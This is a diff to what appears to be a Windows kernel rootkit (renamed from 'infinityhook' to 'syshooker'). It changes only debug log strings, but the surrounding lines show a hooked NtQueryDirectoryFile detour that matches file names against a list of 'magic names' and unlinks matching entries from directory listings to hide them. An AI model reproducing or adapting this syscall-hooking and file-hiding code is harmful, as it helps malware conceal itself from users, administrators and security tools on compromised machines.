@@ -32,7 +32,7 @@ NTSTATUS DetourNtQueryDirectoryFile(
 	_In_opt_ PUNICODE_STRING FileName,
 	_In_ BOOLEAN RestartScan)
 {
-	//kprintf("[+] infinityhook: NtQueryDirectoryFile: %wZ, class: %d\n", FileName, FileInformationClass);
+	//kprintf("[+] syshooker: NtQueryDirectoryFile: %wZ, class: %d\n", FileName, FileInformationClass);
 
 	//
 	// Call the original syscall so that the buffers are populated
@@ -62,10 +62,10 @@ NTSTATUS DetourNtQueryDirectoryFile(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				//kprintf("[+] infinityhook: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
+				//kprintf("[+] syshooker: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
 				//if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);
 
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -91,7 +91,7 @@ NTSTATUS DetourNtQueryDirectoryFile(
 
 					// Last one
 					else {
-						kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE - LAST ONE\n");
+						kprintf("[+] syshooker: NtQueryDirectoryFile: SHOULD HIDE - LAST ONE\n");
 
 						// set previous NextEntryOffset to 0
 						PreviousFileInformationPtr->NextEntryOffset = 0;
